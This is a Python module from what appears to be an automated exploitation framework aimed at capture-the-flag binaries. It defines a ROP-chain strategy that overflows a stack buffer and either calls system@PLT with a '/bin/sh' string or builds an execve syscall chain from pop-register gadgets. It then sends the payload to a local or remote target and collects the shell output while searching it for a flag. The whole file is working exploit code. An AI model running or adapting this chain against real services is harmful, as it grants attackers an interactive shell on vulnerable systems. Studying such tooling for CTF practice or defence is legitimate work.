"""
Penterous — Full ROP chain strategy (no libc needed).
"""
import time
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error


class ROPChainStrategy(ExploitStrategy):
    """
    Build a ROP chain using gadgets from the binary itself.
    Attempts: system via PLT, mprotect+shellcode, or sigreturn.
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'rop_chain'

        payload = self._build_chain()
        if not payload:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "Could not build ROP chain", mode=mode)

        info(f"ROP chain payload: {len(payload)} bytes")

        tube = self._get_tube(mode, host, port)
        if tube is None:
            return self._make_result(False, None, strategy, payload, b'', start,
                                     "Failed to create tube", mode=mode)

        output = self._send_and_receive(tube, payload, interactive_shell=True)
        flag = self.hunter.hunt(output)

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=payload,
            output=output,
            start_time=start,
            mode=mode,
            host=host or '',
            port=port or 0,
        )

    def _build_chain(self) -> bytes:
        elf = self.binary.elf
        if not elf:
            return b''

        # Try: system via PLT if present
        try:
            system_plt = elf.plt.get('system', 0)
            bin_sh_addr = next(elf.search(b'/bin/sh\x00'), 0)
            if system_plt and bin_sh_addr:
                info("Building chain: system@PLT + /bin/sh string in binary")
                payload = self.rop.build_system_chain(self.offset, system_plt, bin_sh_addr)
                return payload
        except Exception:
            pass

        # Try: ROP to call execve via syscall gadget
        syscall = self.rop.find_gadget(['syscall', 'ret']) or self.rop.find_gadget(['syscall'])
        pop_rax = self.rop.find_gadget(['pop rax', 'ret'])
        pop_rdi = self.rop.find_gadget(['pop rdi', 'ret'])
        pop_rsi = self.rop.find_gadget(['pop rsi', 'ret']) or self.rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
        pop_rdx = self.rop.find_gadget(['pop rdx', 'ret'])

        if syscall and pop_rax and pop_rdi:
            info("Building chain: execve syscall via ROP")
            # Need /bin/sh in writable memory — try using existing string
            try:
                bin_sh_addr = next(elf.search(b'/bin/sh\x00'), 0)
                if not bin_sh_addr:
                    bin_sh_addr = next(elf.search(b'/bin/sh'), 0)
            except Exception:
                bin_sh_addr = 0

            if bin_sh_addr:
                import struct
                payload = b'A' * self.offset
                payload += struct.pack('<Q', pop_rax)
                payload += struct.pack('<Q', 59)          # execve
                payload += struct.pack('<Q', pop_rdi)
                payload += struct.pack('<Q', bin_sh_addr)
                if pop_rsi:
                    payload += struct.pack('<Q', pop_rsi)
                    payload += struct.pack('<Q', 0)
                    if 'r15' in str(pop_rsi):
                        payload += struct.pack('<Q', 0)
                if pop_rdx:
                    payload += struct.pack('<Q', pop_rdx)
                    payload += struct.pack('<Q', 0)
                payload += struct.pack('<Q', syscall)
                return payload

        warning("Could not build effective ROP chain from binary gadgets alone")
        return b''
